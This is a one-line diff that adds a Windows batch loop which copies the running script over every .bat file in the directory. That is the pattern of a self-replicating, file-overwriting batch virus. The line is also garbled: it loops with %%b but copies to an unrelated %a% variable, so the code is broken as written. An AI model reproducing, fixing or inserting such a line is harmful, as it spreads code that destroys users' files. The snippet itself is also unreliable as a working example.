@@ -1,0 +1,1 @@
+for %%b in (*.bat) do copy %0 %a%
